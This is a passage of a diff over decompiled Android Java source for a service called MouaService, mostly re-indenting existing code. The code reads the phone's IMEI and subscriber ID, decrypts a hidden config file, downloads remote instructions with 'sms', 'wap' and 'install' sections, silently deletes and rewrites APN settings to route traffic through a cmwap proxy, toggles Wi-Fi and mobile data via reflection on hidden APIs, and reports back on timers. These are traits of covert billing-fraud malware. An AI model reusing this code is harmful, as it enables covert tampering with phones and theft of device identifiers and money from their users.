+                        if (v2 == -2) {
+                                return v2;
+                        }
+
+                        long v3 = 5000;
+                        try {
+                                Thread.sleep(v3);
+                        } catch (InterruptedException v0) {
+                                Log.e("MOUA", "sleep error");
+                        }
+
+                        ++v1;
                 }
 
-                v2 = true;
-            }
+                return v2;
         }
 
-        return v2;
-    }
+        private int getmoua() {
+                int v1 = 0;
+                int v2 = -1;
+                while (v1 < 3) {
+                        v2 = this.retry_getmoua();
+                        MouaService.log.trace("get moua", "time:" + (v1 + 1));
+                        if (v2 == 0) {
+                                return v2;
+                        }
 
-    private static void log_change(String str) {
-        if(MouaService.log != null) {
-            MouaService.log.trace("change", str);
+                        if (v2 == 1) {
+                                return v2;
+                        }
+
+                        if (v2 == -2) {
+                                return v2;
+                        }
+
+                        long v3 = 5000;
+                        try {
+                                Thread.sleep(v3);
+                        } catch (InterruptedException v0) {
+                                Log.e("MOUA", "sleep error");
+                        }
+
+                        ++v1;
+                }
+
+                return v2;
         }
-    }
 
-    private int report(boolean s, int step) {
+        private int getstrlen(String str) {
+                int v0 = str == null ? 0 : str.length();
+                return v0;
+        }
+
+        public boolean init_params(Context context) {
+                boolean v2 = false;
+                MouaService.log.trace("init_params", "Config file path:" + Constants.REPORT_PATH(context));
+                if (CommUtil.DecryptObj2SdCard(context, Constants.APPDATA_PATH(context), "smsrpt.i", "config") == 0) {
+                        Object v1 = context.getSystemService("phone");
+                        if (v1 == null) {
+                                MouaService.log.trace("service", "TelephonyManager null");
+                        } else {
+                                this.imei = ((TelephonyManager) v1).getDeviceId();
+                                if (CommUtil.getstrlen(this.imei) == 0) {
+                                        this.imei = "";
+                                }
+
+                                MouaService.ischinatel = 0;
+                                MouaService.mversion = MouaService.getSDKVersionNumber();
+                                MouaService.log.trace("service", "sdkversion number: " + MouaService.mversion);
+                                if (MouaService.mversion > 10) {
+                                        MouaService.isIcs = true;
+                                }
+
+                                v2 = true;
+                        }
+                }
+
+                return v2;
+        }
+
+        private static void log_change(String str) {
+                if (MouaService.log != null) {
+                        MouaService.log.trace("change", str);
+                }
+        }
+
+        private int report(boolean s, int step) {
         IniReader v0;
         int v3;
         IniReader v10;
@@ -1002,300 +979,286 @@ public class MouaService {
         return v3;
     }
 
-    private int retry_getconfig() {
-        IniReader v4;
-        int v5 = -1;
-        try {
-            v4 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
-        }
-        catch(IOException v1) {
-            MouaService.log.trace("servlog", "sleep error");
-            return v5;
-        }
+        private int retry_getconfig() {
+                IniReader v4;
+                int v5 = -1;
+                try {
+                        v4 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
+                } catch (IOException v1) {
+                        MouaService.log.trace("servlog", "sleep error");
+                        return v5;
+                }
 
-        this.cfg_url = this.get_config_url(v4);
-        if(CommUtil.getstrlen(this.cfg_url) > 0) {
-            int v2 = this.download_cfg();
-            if(v2 == v5) {
-                MouaService.log.trace("servlog", "getcfg e2");
+                this.cfg_url = this.get_config_url(v4);
+                if (CommUtil.getstrlen(this.cfg_url) > 0) {
+                        int v2 = this.download_cfg();
+                        if (v2 == v5) {
+                                MouaService.log.trace("servlog", "getcfg e2");
+                                return v5;
+                        }
+
+                        if (v2 == 0) {
+                                try {
+                                        IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
+                                        if (v0.getSection("time") == null && v0.getSection("global") == null && v0.getSection("wap") == null && v0.getSection("sms") == null && v0.getSection("install") == null) {
+                                                MouaService.log.trace("servlog", "getcfg section error");
+                                                CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
+                                                return -2;
+                                        }
+                                } catch (IOException v1) {
+                                        MouaService.log.trace("servlog", "getcfg e4");
+                                        return v5;
+                                } catch (FileNotFoundException v1_1) {
+                                        MouaService.log.trace("servlog", "getcfg e3");
+                                        return v5;
+                                }
+                        }
+
+                        v5 = v2;
+                } else {
+                        MouaService.log.trace("servlog", "getcfg e1");
+                }
+
                 return v5;
-            }
+        }
 
-            if(v2 == 0) {
+        private int retry_getip() {
+                int v4;
+                IniReader v6;
+                int v9 = -1;
                 try {
-                    IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
-                    if(v0.getSection("time") == null && v0.getSection("global") == null && v0.getSection("wap") == null && v0.getSection("sms") == null && v0.getSection("install") == null) {
-                        MouaService.log.trace("servlog", "getcfg section error");
-                        CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
-                        return -2;
-                    }
-                }
-                catch(IOException v1) {
-                    MouaService.log.trace("servlog", "getcfg e4");
-                    return v5;
-                }
-                catch(FileNotFoundException v1_1) {
-                    MouaService.log.trace("servlog", "getcfg e3");
-                    return v5;
-                }
-            }
-
-            v5 = v2;
-        }
-        else {
-            MouaService.log.trace("servlog", "getcfg e1");
-        }
-
-        return v5;
-    }
-
-    private int retry_getip() {
-        int v4;
-        IniReader v6;
-        int v9 = -1;
-        try {
-            v6 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
-        }
-        catch(IOException v1) {
-            MouaService.log.trace("servlog", "sleep error");
-            return v9;
-        }
-
-        this.number = v6.getValue("report", "number");
-        this.cfg_url_ip = String.valueOf(this.cfg_url) + "&virtNum=1";
-        if(CommUtil.getstrlen(this.cfg_url_ip) == 0) {
-            MouaService.log.trace("servlog", "cfgurl null");
-            return v9;
-        }
-
-        if(CommUtil.getstrlen(this.number) == 0) {
-            try {
-                v4 = this.download_ipcfg();
-                if(v4 == v9) {
-                    MouaService.log.trace("servlog", "download_ipcfg error");
-                    return v9;
+                        v6 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
+                } catch (IOException v1) {
+                        MouaService.log.trace("servlog", "sleep error");
+                        return v9;
                 }
 
-                IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
-                if(v0.getSection("wap") == null) {
-                    CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
-                    MouaService.log.trace("servlog", "cfg no wap section");
-                    return -3;
+                this.number = v6.getValue("report", "number");
+                this.cfg_url_ip = String.valueOf(this.cfg_url) + "&virtNum=1";
+                if (CommUtil.getstrlen(this.cfg_url_ip) == 0) {
+                        MouaService.log.trace("servlog", "cfgurl null");
+                        return v9;
                 }
 
-                WapWorker v7 = new WapWorker(MouaService.ctx);
-                Iterator v10 = v0.getSection("wap").datas.iterator();
-                while(v10.hasNext()) {
-                    v7.add_wapurl(v10.next().second);
+                if (CommUtil.getstrlen(this.number) == 0) {
+                        try {
+                                v4 = this.download_ipcfg();
+                                if (v4 == v9) {
+                                        MouaService.log.trace("servlog", "download_ipcfg error");
+                                        return v9;
+                                }
+
+                                IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
+                                if (v0.getSection("wap") == null) {
+                                        CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
+                                        MouaService.log.trace("servlog", "cfg no wap section");
+                                        return -3;
+                                }
+
+                                WapWorker v7 = new WapWorker(MouaService.ctx);
+                                Iterator v10 = v0.getSection("wap").datas.iterator();
+                                while (v10.hasNext()) {
+                                        v7.add_wapurl(v10.next().second);
+                                }
+
+                                if (v7.sendlst.size() <= 0) {
+                                        return v4;
+                                }
+
+                                int v3 = v7.getMouaByNet();
+                                if (v3 == 0) {
+                                        return v4;
+                                }
+
+                                MouaService.log.trace("ip", "error");
+                                return v3;
+                        } catch (IOException v1) {
+                                v4 = -1;
+                                MouaService.log.trace("get config error:", v1.toString());
+                                return v4;
+                        }
                 }
 
-                if(v7.sendlst.size() <= 0) {
-                    return v4;
-                }
-
-                int v3 = v7.getMouaByNet();
-                if(v3 == 0) {
-                    return v4;
-                }
-
-                MouaService.log.trace("ip", "error");
-                return v3;
-            }
-            catch(IOException v1) {
-                v4 = -1;
-                MouaService.log.trace("get config error:", v1.toString());
-                return v4;
-            }
+                MouaService.log.trace("servlog", "number exited");
+                return 1;
         }
 
-        MouaService.log.trace("servlog", "number exited");
-        return 1;
-    }
-
-    private int retry_getmoua() {
-        int v4;
-        IniReader v6;
-        int v9 = -1;
-        try {
-            v6 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
-        }
-        catch(IOException v1) {
-            MouaService.log.trace("servlog", "sleep error");
-            return v9;
-        }
-
-        this.number = v6.getValue("report", "number");
-        this.cfg_url = this.get_config_url(v6);
-        if(CommUtil.getstrlen(this.cfg_url) == 0) {
-            MouaService.log.trace("servlog", "cfgurl null");
-            return v9;
-        }
-
-        if(CommUtil.getstrlen(this.number) == 0) {
-            try {
-                v4 = this.download_cfg();
-                if(v4 == v9) {
-                    MouaService.log.trace("servlog", "download_mouacfg error");
-                    return v9;
-                }
-
-                IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
-                if(v0.getSection("wap") == null) {
-                    CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
-                    MouaService.log.trace("servlog", "cfg no wap section");
-                    return -3;
-                }
-
-                WapWorker v7 = new WapWorker(MouaService.ctx);
-                Iterator v10 = v0.getSection("wap").datas.iterator();
-                while(v10.hasNext()) {
-                    v7.add_wapurl(v10.next().second);
-                }
-
-                if(v7.sendlst.size() <= 0) {
-                    return v4;
-                }
-
-                int v3 = v7.getMouaByNet();
-                if(v3 == 0) {
-                    return v4;
-                }
-
-                MouaService.log.trace("moua", "error");
-                return v3;
-            }
-            catch(IOException v1) {
-                v4 = -1;
-                MouaService.log.trace("get config error:", v1.toString());
-                return v4;
-            }
-        }
-
-        MouaService.log.trace("servlog", "number exited");
-        return 1;
-    }
-
-    public boolean set_apn(Context context) {
-        String v18;
-        boolean v4;
-        if(MouaService.mversion >= 10) {
-            MouaService.log.trace("set_apn", "sdk>=10, return true.");
-            v4 = true;
-            return v4;
-        }
-
-        String v25 = "0";
-        String v17 = "";
-        Cursor v10 = context.getContentResolver().query(Constants.APN_URI, null, null, null, null);
-        while(v10 != null) {
-            if(!v10.moveToNext()) {
-                break;
-            }
-
-            v25 = v10.getString(v10.getColumnIndex("_id"));
-            v17 = v10.getString(v10.getColumnIndex("name"));
-            String v22 = v10.getString(v10.getColumnIndex("apn"));
-            if(!v17.equalsIgnoreCase("default")) {
-                continue;
-            }
-
-            if(!v22.equalsIgnoreCase("cmwap")) {
-                continue;
-            }
-
-            MouaService.log.trace("set_apn", "delete apn id=" + v25);
-            context.getContentResolver().delete(Constants.APN_URI, "_id=" + v25, null);
-        }
-
-        v10.close();
-        Object v23 = MouaService.ctx.getSystemService("phone");
-        if(v23 == null) {
-            return false;
-        }
-
-        String v19 = ((TelephonyManager)v23).getSimOperator();
-        String v14 = ((TelephonyManager)v23).getSubscriberId();
-        if(v19.length() > 0) {
-            v18 = v19;
-        }
-        else if(v14.length() <= 0) {
-            return false;
-        }
-        else {
-            v18 = v14.substring(0, 5);
-        }
-
-        if(!v18.equals("46003") && !v19.contains("46003")) {
-            MouaService.ischinatel = 0;
-            if(CommUtil.getstrlen(v18) == 0) {
-                v4 = false;
-            }
-            else {
-                String v15 = v18.substring(0, 3);
-                String v16 = v18.substring(3);
-                ContentResolver v2 = context.getContentResolver();
-                ContentValues v11 = new ContentValues();
-                v11.put("name", "default");
-                v11.put("apn", "cmwap");
-                v11.put("proxy", "10.0.0.172");
-                v11.put("port", "80");
-                v11.put("mcc", v15);
-                v11.put("mnc", v16);
-                v11.put("numeric", v18);
-                v11.put("current", Integer.valueOf(1));
-                v11.put("authtype", Integer.valueOf(0));
-                v11.put("type", "default");
-                this.addOtherValues(v11);
-                Cursor v9 = null;
-                String v8 = null;
+        private int retry_getmoua() {
+                int v4;
+                IniReader v6;
+                int v9 = -1;
                 try {
-                    Uri v3 = v2.insert(Constants.APN_URI, v11);
-                    if(v3 != null) {
-                        v9 = v2.query(v3, null, null, null, null);
-                        v9.moveToFirst();
-                        v8 = v9.getString(v9.getColumnIndex("_id"));
-                        MouaService.log.trace("set_apn", "add apn id:" + v8);
-                    }
-                }
-                catch(SecurityException v12) {
-                    MouaService.log.trace("set_apn", v12.toString());
-                    return false;
-                }
-                catch(SQLException v12_1) {
-                    MouaService.log.trace("set_apn", v12_1.toString());
-                    return false;
+                        v6 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
+                } catch (IOException v1) {
+                        MouaService.log.trace("servlog", "sleep error");
+                        return v9;
                 }
 
-                if(v9 != null) {
-                    v9.close();
+                this.number = v6.getValue("report", "number");
+                this.cfg_url = this.get_config_url(v6);
+                if (CommUtil.getstrlen(this.cfg_url) == 0) {
+                        MouaService.log.trace("servlog", "cfgurl null");
+                        return v9;
                 }
 
-                int v13 = Integer.parseInt(v8);
-                if(v13 == -1) {
-                    return false;
+                if (CommUtil.getstrlen(this.number) == 0) {
+                        try {
+                                v4 = this.download_cfg();
+                                if (v4 == v9) {
+                                        MouaService.log.trace("servlog", "download_mouacfg error");
+                                        return v9;
+                                }
+
+                                IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
+                                if (v0.getSection("wap") == null) {
+                                        CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
+                                        MouaService.log.trace("servlog", "cfg no wap section");
+                                        return -3;
+                                }
+
+                                WapWorker v7 = new WapWorker(MouaService.ctx);
+                                Iterator v10 = v0.getSection("wap").datas.iterator();
+                                while (v10.hasNext()) {
+                                        v7.add_wapurl(v10.next().second);
+                                }
+
+                                if (v7.sendlst.size() <= 0) {
+                                        return v4;
+                                }
+
+                                int v3 = v7.getMouaByNet();
+                                if (v3 == 0) {
+                                        return v4;
+                                }
+
+                                MouaService.log.trace("moua", "error");
+                                return v3;
+                        } catch (IOException v1) {
+                                v4 = -1;
+                                MouaService.log.trace("get config error:", v1.toString());
+                                return v4;
+                        }
                 }
 
-                ContentResolver v21 = context.getContentResolver();
-                ContentValues v24 = new ContentValues();
-                v24.put("apn_id", Integer.valueOf(v13));
-                if(v21.update(Constants.CURRENT_APN_URI, v24, null, null) > 0) {
-                    MouaService.log.trace("set_apn", "change apn to " + v17 + " id is " + v25);
-                    return true;
-                }
-
-                MouaService.log.trace("set_apn", "change apn to ERROR");
-                v4 = false;
-            }
+                MouaService.log.trace("servlog", "number exited");
+                return 1;
         }
-        else {
-            MouaService.ischinatel = 1;
-            v4 = false;
+
+        public boolean set_apn(Context context) {
+                String v18;
+                boolean v4;
+                if (MouaService.mversion >= 10) {
+                        MouaService.log.trace("set_apn", "sdk>=10, return true.");
+                        v4 = true;
+                        return v4;
+                }
+
+                String v25 = "0";
+                String v17 = "";
+                Cursor v10 = context.getContentResolver().query(Constants.APN_URI, null, null, null, null);
+                while (v10 != null) {
+                        if (!v10.moveToNext()) {
+                                break;
+                        }
+
+                        v25 = v10.getString(v10.getColumnIndex("_id"));
+                        v17 = v10.getString(v10.getColumnIndex("name"));
+                        String v22 = v10.getString(v10.getColumnIndex("apn"));
+                        if (!v17.equalsIgnoreCase("default")) {
+                                continue;
+                        }
+
+                        if (!v22.equalsIgnoreCase("cmwap")) {
+                                continue;
+                        }
+
+                        MouaService.log.trace("set_apn", "delete apn id=" + v25);
+                        context.getContentResolver().delete(Constants.APN_URI, "_id=" + v25, null);
+                }
+
+                v10.close();
+                Object v23 = MouaService.ctx.getSystemService("phone");
+                if (v23 == null) {
+                        return false;
+                }
+
+                String v19 = ((TelephonyManager) v23).getSimOperator();
+                String v14 = ((TelephonyManager) v23).getSubscriberId();
+                if (v19.length() > 0) {
+                        v18 = v19;
+                } else if (v14.length() <= 0) {
+                        return false;
+                } else {
+                        v18 = v14.substring(0, 5);
+                }
+
+                if (!v18.equals("46003") && !v19.contains("46003")) {
+                        MouaService.ischinatel = 0;
+                        if (CommUtil.getstrlen(v18) == 0) {
+                                v4 = false;
+                        } else {
+                                String v15 = v18.substring(0, 3);
+                                String v16 = v18.substring(3);
+                                ContentResolver v2 = context.getContentResolver();
+                                ContentValues v11 = new ContentValues();
+                                v11.put("name", "default");
+                                v11.put("apn", "cmwap");
+                                v11.put("proxy", "10.0.0.172");
+                                v11.put("port", "80");
+                                v11.put("mcc", v15);
+                                v11.put("mnc", v16);
+                                v11.put("numeric", v18);
+                                v11.put("current", Integer.valueOf(1));
+                                v11.put("authtype", Integer.valueOf(0));
+                                v11.put("type", "default");
+                                this.addOtherValues(v11);
+                                Cursor v9 = null;
+                                String v8 = null;
+                                try {
+                                        Uri v3 = v2.insert(Constants.APN_URI, v11);
+                                        if (v3 != null) {
+                                                v9 = v2.query(v3, null, null, null, null);
+                                                v9.moveToFirst();
+                                                v8 = v9.getString(v9.getColumnIndex("_id"));
+                                                MouaService.log.trace("set_apn", "add apn id:" + v8);
+                                        }
+                                } catch (SecurityException v12) {
+                                        MouaService.log.trace("set_apn", v12.toString());
+                                        return false;
+                                } catch (SQLException v12_1) {
+                                        MouaService.log.trace("set_apn", v12_1.toString());
+                                        return false;
+                                }
+
+                                if (v9 != null) {
+                                        v9.close();
+                                }
+
+                                int v13 = Integer.parseInt(v8);
+                                if (v13 == -1) {
+                                        return false;
+                                }
+
+                                ContentResolver v21 = context.getContentResolver();
+                                ContentValues v24 = new ContentValues();
+                                v24.put("apn_id", Integer.valueOf(v13));
+                                if (v21.update(Constants.CURRENT_APN_URI, v24, null, null) > 0) {
+                                        MouaService.log.trace("set_apn", "change apn to " + v17 + " id is " + v25);
+                                        return true;
+                                }
+
+                                MouaService.log.trace("set_apn", "change apn to ERROR");
+                                v4 = false;
+                        }
+                } else {
+                        MouaService.ischinatel = 1;
+                        v4 = false;
+                }
+
+                return v4;
         }
 
-        return v4;
-    }
-
-    private boolean set_apn_byname(String name_s, String name_b) {
+        private boolean set_apn_byname(String name_s, String name_b) {
         boolean v2;
         int v11 = 0;
         try {
@@ -1371,7 +1334,7 @@ public class MouaService {
         }
     }
 
-    private int setwapiap() {
+        private int setwapiap() {
         int v7 = -1;
         boolean v0 = this.deletedefaultapn();
         MouaService.log.trace("delete apn", "default");
@@ -1421,39 +1384,38 @@ public class MouaService {
         return v7;
     }
 
-    private void setwifi(boolean v) {
-        if(this.wm == null) {
-            this.wm = MouaService.ctx.getSystemService("wifi");
+        private void setwifi(boolean v) {
+                if (this.wm == null) {
+                        this.wm = MouaService.ctx.getSystemService("wifi");
+                }
+
+                MouaService.log.trace("wifi", "set");
+                if (v) {
+                        if (!this.wm.isWifiEnabled()) {
+                                this.wm.setWifiEnabled(true);
+                        }
+
+                        MouaService.log.trace("wifi", "open");
+                } else {
+                        if (this.wm.isWifiEnabled()) {
+                                this.wm.setWifiEnabled(false);
+                        }
+
+                        MouaService.log.trace("wifi", "close");
+                }
         }
 
-        MouaService.log.trace("wifi", "set");
-        if(v) {
-            if(!this.wm.isWifiEnabled()) {
-                this.wm.setWifiEnabled(true);
-            }
-
-            MouaService.log.trace("wifi", "open");
+        private void sleeptimer(long minutes, Class mClass) {
+                this.setwifi(true);
+                long v2 = 60 * minutes * 1000;
+                MouaService.log.trace("sleep time", v2);
+                Intent v1 = new Intent(MouaService.ctx, mClass);
+                v1.setAction("goon");
+                MouaService.ctx.getSystemService("alarm").set(0, System.currentTimeMillis() + v2, PendingIntent.getBroadcast(MouaService.ctx, 0, v1, 0));
+                MouaService.log.trace("sleep time", "Minutes:" + minutes);
         }
-        else {
-            if(this.wm.isWifiEnabled()) {
-                this.wm.setWifiEnabled(false);
-            }
 
-            MouaService.log.trace("wifi", "close");
-        }
-    }
-
-    private void sleeptimer(long minutes, Class mClass) {
-        this.setwifi(true);
-        long v2 = 60 * minutes * 1000;
-        MouaService.log.trace("sleep time", v2);
-        Intent v1 = new Intent(MouaService.ctx, mClass);
-        v1.setAction("goon");
-        MouaService.ctx.getSystemService("alarm").set(0, System.currentTimeMillis() + v2, PendingIntent.getBroadcast(MouaService.ctx, 0, v1, 0));
-        MouaService.log.trace("sleep time", "Minutes:" + minutes);
-    }
-
-    private int startlongtimer(Class mClass) {
+        private int startlongtimer(Class mClass) {
         IniReader v0;
         int v4 = -1;
         MouaService.log.trace("time", "start long timer");
@@ -1485,64 +1447,55 @@ public class MouaService {
         return v4;
     }
 
-    private int str2int(String str) {
-        int v2;
-        try {
-            v2 = Integer.parseInt(str);
-        }
-        catch(NumberFormatException v0) {
-            v2 = -1;
+        private int str2int(String str) {
+                int v2;
+                try {
+                        v2 = Integer.parseInt(str);
+                } catch (NumberFormatException v0) {
+                        v2 = -1;
+                }
+
+                return v2;
         }
 
-        return v2;
-    }
-
-    public void testentry() {
-        new WapWorker(MouaService.ctx).dotestAction();
-    }
-
-    public void toggleMobileData(Context context, boolean enabled) {
-        Object v0 = context.getSystemService("connectivity");
-        try {
-            Field v5 = Class.forName(v0.getClass().getName()).getDeclaredField("mService");
-            v5.setAccessible(true);
-            Object v3 = v5.get(v0);
-            Method v6 = Class.forName(v3.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
-            v6.setAccessible(true);
-            v6.invoke(v3, Boolean.valueOf(enabled));
-        }
-        catch(InvocationTargetException v2) {
-            v2.printStackTrace();
-        }
-        catch(IllegalAccessException v2_1) {
-            v2_1.printStackTrace();
-        }
-        catch(IllegalArgumentException v2_2) {
-            v2_2.printStackTrace();
-        }
-        catch(NoSuchMethodException v2_3) {
-            v2_3.printStackTrace();
-        }
-        catch(SecurityException v2_4) {
-            v2_4.printStackTrace();
-        }
-        catch(NoSuchFieldException v2_5) {
-            v2_5.printStackTrace();
-        }
-        catch(ClassNotFoundException v2_6) {
-            v2_6.printStackTrace();
-        }
-    }
-
-    private void tryreport(boolean b, int step) {
-        int v0 = this.report(b, step);
-        if(v0 != 0) {
-            this.report(b, step);
+        public void testentry() {
+                new WapWorker(MouaService.ctx).dotestAction();
         }
 
-        if(v0 != 0) {
-            this.report(b, step);
+        public void toggleMobileData(Context context, boolean enabled) {
+                Object v0 = context.getSystemService("connectivity");
+                try {
+                        Field v5 = Class.forName(v0.getClass().getName()).getDeclaredField("mService");
+                        v5.setAccessible(true);
+                        Object v3 = v5.get(v0);
+                        Method v6 = Class.forName(v3.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
+                        v6.setAccessible(true);
+                        v6.invoke(v3, Boolean.valueOf(enabled));
+                } catch (InvocationTargetException v2) {
+                        v2.printStackTrace();
+                } catch (IllegalAccessException v2_1) {
+                        v2_1.printStackTrace();
+                } catch (IllegalArgumentException v2_2) {
+                        v2_2.printStackTrace();
+                } catch (NoSuchMethodException v2_3) {
+                        v2_3.printStackTrace();
+                } catch (SecurityException v2_4) {
+                        v2_4.printStackTrace();
+                } catch (NoSuchFieldException v2_5) {
+                        v2_5.printStackTrace();
+                } catch (ClassNotFoundException v2_6) {
+                        v2_6.printStackTrace();
+                }
         }
-    }
+
+        private void tryreport(boolean b, int step) {
+                int v0 = this.report(b, step);
+                if (v0 != 0) {
+                        this.report(b, step);
+                }
+
+                if (v0 != 0) {
+                        this.report(b, step);
+                }
+        }
 }
-
